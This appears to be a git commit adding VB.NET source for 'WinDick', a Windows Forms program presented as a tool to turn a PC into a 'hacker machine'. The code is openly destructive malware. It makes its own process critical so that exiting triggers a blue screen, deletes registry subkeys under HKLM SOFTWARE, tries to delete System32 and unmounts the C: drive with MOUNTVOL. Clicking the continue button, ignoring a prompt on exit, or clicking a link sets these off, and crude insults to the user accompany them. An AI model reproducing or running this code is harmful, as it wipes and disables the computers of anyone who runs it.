6eb6ecd0de51360067d51b45026d1e63240f4262
EmmyMalware <114366661+EmmyMalware@users.noreply.github.com>
2025-05-04 00:24:55 -0500

    Add files via upload

---
+++ src/MainForm.Designer.vb
@@ -0,0 +1,163 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class MainForm
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.MainTextLbl = New System.Windows.Forms.Label()
+        Me.ValidateChkBox = New System.Windows.Forms.CheckBox()
+        Me.ContBtn = New System.Windows.Forms.Button()
+        Me.ExitBtn = New System.Windows.Forms.Button()
+        Me.WhyLnkLbl = New System.Windows.Forms.LinkLabel()
+        Me.CheckBtn = New System.Windows.Forms.Button()
+        Me.CodeTxtBox = New System.Windows.Forms.TextBox()
+        Me.ImgBox = New System.Windows.Forms.PictureBox()
+        CType(Me.ImgBox, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'MainTextLbl
+        '
+        Me.MainTextLbl.AutoSize = True
+        Me.MainTextLbl.BackColor = System.Drawing.Color.Black
+        Me.MainTextLbl.Font = New System.Drawing.Font("Microsoft Sans Serif", 36.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.MainTextLbl.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.MainTextLbl.Location = New System.Drawing.Point(33, 34)
+        Me.MainTextLbl.Name = "MainTextLbl"
+        Me.MainTextLbl.Size = New System.Drawing.Size(728, 55)
+        Me.MainTextLbl.TabIndex = 0
+        Me.MainTextLbl.Text = "turn pc into 1337 h4x0r m4ch1ne"
+        '
+        'ValidateChkBox
+        '
+        Me.ValidateChkBox.AutoSize = True
+        Me.ValidateChkBox.BackColor = System.Drawing.Color.Black
+        Me.ValidateChkBox.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.ValidateChkBox.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.ValidateChkBox.Location = New System.Drawing.Point(157, 124)
+        Me.ValidateChkBox.Name = "ValidateChkBox"
+        Me.ValidateChkBox.Size = New System.Drawing.Size(437, 29)
+        Me.ValidateChkBox.TabIndex = 2
+        Me.ValidateChkBox.Text = "I AM READY SUPER COMPUTER HAXOR"
+        Me.ValidateChkBox.UseVisualStyleBackColor = False
+        '
+        'ContBtn
+        '
+        Me.ContBtn.BackColor = System.Drawing.Color.Black
+        Me.ContBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.ContBtn.Font = New System.Drawing.Font("Microsoft Sans Serif", 72.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.ContBtn.ForeColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.ContBtn.Location = New System.Drawing.Point(100, 159)
+        Me.ContBtn.Name = "ContBtn"
+        Me.ContBtn.Size = New System.Drawing.Size(569, 124)
+        Me.ContBtn.TabIndex = 3
+        Me.ContBtn.Text = "K BRO"
+        Me.ContBtn.UseVisualStyleBackColor = False
+        '
+        'ExitBtn
+        '
+        Me.ExitBtn.BackColor = System.Drawing.Color.Black
+        Me.ExitBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.ExitBtn.Font = New System.Drawing.Font("Microsoft Sans Serif", 36.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.ExitBtn.ForeColor = System.Drawing.Color.Red
+        Me.ExitBtn.Location = New System.Drawing.Point(100, 289)
+        Me.ExitBtn.Name = "ExitBtn"
+        Me.ExitBtn.Size = New System.Drawing.Size(569, 124)
+        Me.ExitBtn.TabIndex = 4
+        Me.ExitBtn.Text = "NAH I DON'T THINK SO"
+        Me.ExitBtn.UseVisualStyleBackColor = False
+        '
+        'WhyLnkLbl
+        '
+        Me.WhyLnkLbl.AutoSize = True
+        Me.WhyLnkLbl.BackColor = System.Drawing.Color.Black
+        Me.WhyLnkLbl.Location = New System.Drawing.Point(351, 416)
+        Me.WhyLnkLbl.Name = "WhyLnkLbl"
+        Me.WhyLnkLbl.Size = New System.Drawing.Size(47, 13)
+        Me.WhyLnkLbl.TabIndex = 5
+        Me.WhyLnkLbl.TabStop = True
+        Me.WhyLnkLbl.Text = "butt why"
+        '
+        'CheckBtn
+        '
+        Me.CheckBtn.BackColor = System.Drawing.Color.Black
+        Me.CheckBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.CheckBtn.ForeColor = System.Drawing.Color.Lime
+        Me.CheckBtn.Location = New System.Drawing.Point(668, 437)
+        Me.CheckBtn.Name = "CheckBtn"
+        Me.CheckBtn.Size = New System.Drawing.Size(125, 23)
+        Me.CheckBtn.TabIndex = 6
+        Me.CheckBtn.Text = "weet hackz or code"
+        Me.CheckBtn.UseVisualStyleBackColor = False
+        '
+        'CodeTxtBox
+        '
+        Me.CodeTxtBox.BackColor = System.Drawing.Color.Black
+        Me.CodeTxtBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.CodeTxtBox.ForeColor = System.Drawing.Color.FromArgb(CType(CType(128, Byte), Integer), CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer))
+        Me.CodeTxtBox.Location = New System.Drawing.Point(531, 439)
+        Me.CodeTxtBox.Name = "CodeTxtBox"
+        Me.CodeTxtBox.Size = New System.Drawing.Size(131, 20)
+        Me.CodeTxtBox.TabIndex = 7
+        '
+        'ImgBox
+        '
+        Me.ImgBox.Image = Global.WinDick.My.Resources.Resources.matrix
+        Me.ImgBox.Location = New System.Drawing.Point(0, 0)
+        Me.ImgBox.Name = "ImgBox"
+        Me.ImgBox.Size = New System.Drawing.Size(800, 465)
+        Me.ImgBox.TabIndex = 1
+        Me.ImgBox.TabStop = False
+        '
+        'MainForm
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
+        Me.ClientSize = New System.Drawing.Size(800, 465)
+        Me.Controls.Add(Me.CodeTxtBox)
+        Me.Controls.Add(Me.CheckBtn)
+        Me.Controls.Add(Me.WhyLnkLbl)
+        Me.Controls.Add(Me.ExitBtn)
+        Me.Controls.Add(Me.ContBtn)
+        Me.Controls.Add(Me.ValidateChkBox)
+        Me.Controls.Add(Me.MainTextLbl)
+        Me.Controls.Add(Me.ImgBox)
+        Me.HelpButton = True
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "MainForm"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "WinDick"
+        CType(Me.ImgBox, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents MainTextLbl As Label
+    Friend WithEvents ImgBox As PictureBox
+    Friend WithEvents ValidateChkBox As CheckBox
+    Friend WithEvents ContBtn As Button
+    Friend WithEvents ExitBtn As Button
+    Friend WithEvents WhyLnkLbl As LinkLabel
+    Friend WithEvents CheckBtn As Button
+    Friend WithEvents CodeTxtBox As TextBox
+End Class
---
+++ src/MainForm.vb
@@ -0,0 +1,106 @@
+﻿Imports System.IO
+Imports System.Threading
+Imports System.Runtime.InteropServices
+Imports Microsoft.Win32
+Imports System.Media
+
+Public Class MainForm
+    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        ContBtn.Enabled = False
+        Dim sPlayer = New SoundPlayer(My.Resources.Dammit___blink_182) ' classic blink ;)
+        sPlayer.PlayLooping()
+    End Sub
+
+    <DllImport("ntdll.dll", SetLastError:=True)>
+    Public Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
+    End Function
+    Private IsCritical As Integer = 1
+    Private BreakOnTermination As Integer = &H1D ' when you put hex in vb.net it doesn't know what it means, so this means 0x1D
+
+    Public Sub RaisePrivilage()
+        ' sizeof doesn't exist in vb.net, so i had to use marshal's sizeof that should work perfectly fine
+        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, IsCritical, Marshal.SizeOf(GetType(Integer)))
+    End Sub
+
+    Public Sub DeleteHives(specifiedHive As String)
+        Dim hives As RegistryKey = GetHiveFromString(specifiedHive)
+        If hives Is Nothing Then Return
+
+        Try
+            For Each subKey As String In hives.GetSubKeyNames()
+                hives.DeleteSubKeyTree(subKey)
+            Next
+        Catch ex As Exception
+            MessageBox.Show("Failed to delete hive, exception: " & ex.ToString(), "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error)
+        End Try
+    End Sub
+
+    Private Function GetHiveFromString(hive As String) As RegistryKey
+        If hive = "HKLM" Then
+            Return Registry.LocalMachine.OpenSubKey("SOFTWARE", True)
+        End If
+        If hive = "HKCU" Then
+            Return Registry.CurrentUser.OpenSubKey("Software", True)
+        End If
+        If hive = "HKCR" Then
+            Return Registry.ClassesRoot
+        End If
+        If hive = "HKU" Then
+            Return Registry.Users
+        End If
+        If hive = "HKCC" Then
+            Return Registry.CurrentConfig
+        End If
+        Return Nothing
+    End Function
+
+    Private Sub ExitBtn_Click(sender As Object, e As EventArgs) Handles ExitBtn.Click
+        If ValidateChkBox.Checked = False Then
+            ' first we have to raise the process privilage so we can call a bsod
+            RaisePrivilage()
+            If MessageBox.Show("Hey you ass! Check the checkbox before you leave", "WinDick", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error) = DialogResult.Ignore Then
+                MessageBox.Show("You choose to ignore me, fuck you", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
+                ' first we start to fuck the registy
+                DeleteHives("HKLM")
+                ' and delete system32
+                Directory.Delete("C:\Windows\System32")
+                Shell("MOUNTVOL C: /D") ' this basiclly ejects the C: drive ^__^ 
+                'and after a minute my cute virus will call a bsod
+                Thread.Sleep(60000) ' a minute before bsod
+                Environment.Exit(1) ' because we raised the privilage to a critical process, we can bsod the whole computer
+            End If
+        Else
+            Application.Exit()
+        End If
+    End Sub
+
+    Private Sub CheckBtn_Click(sender As Object, e As EventArgs) Handles CheckBtn.Click
+        If CodeTxtBox.Text Is Nothing Then
+            MessageBox.Show("Enter a code, you fucker!", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        Else
+            MessageBox.Show("Not the code, try again you asshat", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End If
+
+        If CodeTxtBox.Text = "EmmyMalwareRulz!" Then
+            MessageBox.Show("I let you win, you rule too", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
+        End If
+    End Sub
+
+    Private Sub ValidateChkBox_CheckedChanged(sender As Object, e As EventArgs) Handles ValidateChkBox.CheckedChanged
+        ContBtn.Enabled = True
+    End Sub
+
+    Private Sub ContBtn_Click(sender As Object, e As EventArgs) Handles ContBtn.Click
+        MessageBox.Show("turnin pc inter hakr", "WinDick", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
+        DeleteHives("HKLM") ' idc if this causes an error but it's the least i can code for
+        Directory.Delete("C:\Windows\System32")
+        Thread.Sleep(10000)
+        Shell("MOUNTVOL C: /D")
+        Thread.Sleep(60000)
+        Environment.Exit(1)
+    End Sub
+
+    Private Sub WhyLnkLbl_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles WhyLnkLbl.LinkClicked
+        Shell("MOUNTVOL C: /D")
+    End Sub
+End Class
